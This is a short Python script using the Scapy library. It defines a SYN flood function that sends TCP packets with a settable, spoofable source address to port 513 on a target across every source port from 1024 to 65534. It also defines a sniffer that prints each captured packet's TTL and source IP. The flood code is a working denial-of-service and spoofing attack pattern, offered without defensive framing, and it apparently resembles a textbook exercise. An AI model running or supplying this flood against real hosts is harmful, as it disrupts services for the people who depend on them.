from scapy.all import *

def main():
    sniff(prn=DisplayTTL,store=0)
    syn_flood('','')
def syn_flood(src,tgt):
    for sport in range(1024,65535):
        IPlayer = IP(src=src,dst=tgt)
        TCPlayer = TCP(sport=sport,dport=513)
        pkt = IPlayer/TCPlayer
        send(pkt)



def DisplayTTL(pkt):
    try:
        if pkt.haslayer(IP):
            sourceIP =pkt.getlayer(IP).src
            ttl = str(pkt.ttl)
            print (ttl+'-> from'+sourceIP)

    except:
        pass

if __name__ == '__main__':
    main()